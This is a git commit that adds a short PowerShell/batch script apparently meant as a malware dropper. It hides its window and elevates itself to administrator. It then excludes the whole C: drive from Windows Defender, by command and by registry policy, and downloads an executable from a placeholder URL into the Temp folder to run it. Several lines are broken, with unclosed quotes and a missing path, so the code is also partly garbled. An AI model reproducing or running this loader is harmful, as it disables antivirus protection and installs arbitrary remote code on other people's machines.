de8fc458e680f74237db31e1549e2a640d8bb1fa
d3hvck <106494573+d3hvck@users.noreply.github.com>
2025-03-31 22:40:26 +0400

    Create Exp_PowerShell_Test.ps1

---
+++ Exp_PowerShell_Test.ps1
@@ -0,0 +1,15 @@
+powershell -w h -command ""
+
+if not "%1"=="am_admin" (
+    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
+    exit /b
+)
+
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
+
+powershell.exe reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v C:\==
+
+$url = "rawlinkhere"
+$output = "$env:Temp/Outputfile.exe"
+iwr -Uri $url -OutFile $output
+Start-Process -FilePath
